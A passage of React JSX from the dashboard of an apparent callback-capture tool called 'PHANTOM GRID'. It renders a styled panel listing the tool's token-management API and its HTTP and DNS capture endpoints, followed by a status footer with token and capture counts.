                  border: "1px solid rgba(255,170,0,0.15)", borderRadius: 4,
                }}>
                  <div style={{ fontSize: 10, fontWeight: 700, color: "var(--amber)", letterSpacing: 2, marginBottom: 6 }}>
                    ⚠ API ENDPOINTS
                  </div>
                  <pre style={{ margin: 0, fontSize: 10, color: "var(--fg)", lineHeight: 1.8, whiteSpace: "pre-wrap" }}>{
`POST   /api/tokens              Create token
GET    /api/tokens              List tokens
DELETE /api/tokens/<id>         Delete token
GET    /api/tokens/<id>/interactions   Get captures
DELETE /api/tokens/<id>/interactions   Clear captures
GET    /api/poll?since=<ISO>    Poll new interactions
GET    /api/log                 Global log

CAPTURE ENDPOINTS:
ANY    /c/<token_id>            HTTP callback capture
DNS    <token_id>.your.domain   DNS callback capture`
                  }</pre>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* ══ FOOTER ══ */}
      <div style={{
        position: "relative", zIndex: 1, padding: "5px 20px",
        borderTop: "1px solid var(--border)", background: "rgba(5,8,13,0.9)",
        display: "flex", alignItems: "center", gap: 16, fontSize: 9, color: "var(--dim)",
        backdropFilter: "blur(6px)",
      }}>
        <StatusDot active color="var(--accent)" />
        <span>PHANTOM GRID v1.0</span>
        <div style={{ flex: 1 }} />
        <span>Tokens: {state.tokens.length}</span>
        <span>·</span>
        <span>Captures: {totalHits}</span>
        <span>·</span>
        <span>HTTP: {httpHits} / DNS: {dnsHits}</span>
      </div>
    </div>
  );
}
